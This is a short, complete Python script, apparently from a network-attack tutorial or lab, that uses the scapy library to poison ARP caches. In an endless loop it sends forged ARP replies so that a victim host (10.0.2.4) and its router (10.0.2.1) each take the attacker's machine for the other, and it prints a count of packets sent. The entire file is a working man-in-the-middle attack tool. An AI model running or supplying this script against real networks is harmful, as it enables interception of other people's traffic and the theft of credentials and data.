#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
# end get_mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
# end spoof


packet_counter = 0
while True:
    spoof("10.0.2.4", "10.0.2.1")  # Spoofing IP to appear as the router to the victim
    spoof("10.0.2.1", "10.0.2.4")  # Spoofing IP to appear as the victim machine to the router
    packet_counter = packet_counter + 2
    print("\r[+] Packets sent: " + str(packet_counter)), sys.stdout.flush()  # Dynamic Printing
    time.sleep(2)
